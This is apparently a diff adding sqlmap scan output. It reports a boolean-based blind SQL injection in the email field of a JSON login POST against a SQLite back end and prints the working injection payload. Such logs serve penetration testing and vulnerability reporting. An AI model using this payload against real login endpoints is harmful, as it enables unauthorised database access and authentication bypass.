@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 441 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"email":"test@test.com' AND CASE WHEN 4792=4792 THEN 4792 ELSE JSON(CHAR(98,78,116,66)) END-- YlbT","password":"test"}
+---
+back-end DBMS: SQLite
